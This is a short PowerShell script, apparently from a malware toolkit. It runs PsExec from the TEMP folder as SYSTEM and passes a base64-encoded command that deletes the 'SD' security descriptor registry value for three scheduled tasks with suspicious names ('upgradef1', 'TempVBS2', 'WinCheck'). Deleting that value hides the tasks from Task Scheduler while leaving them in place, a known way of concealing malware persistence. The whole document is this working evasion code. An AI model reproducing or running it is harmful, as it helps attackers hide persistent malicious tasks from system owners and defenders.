$PsExecPath = Join-Path $env:TEMP "PsExec64.exe"

$TaskNames = @(
    "upgradef1",
    "TempVBS2",
    "WinCheck"
)

if (Test-Path $PsExecPath) {
    foreach ($TaskName in $TaskNames) {
        $Command = "Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$TaskName' -Name 'SD'"
        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
        $EncodedCommand = [Convert]::ToBase64String($Bytes)
        
        & $PsExecPath /accepteula -s powershell.exe -EncodedCommand $EncodedCommand
    }
}
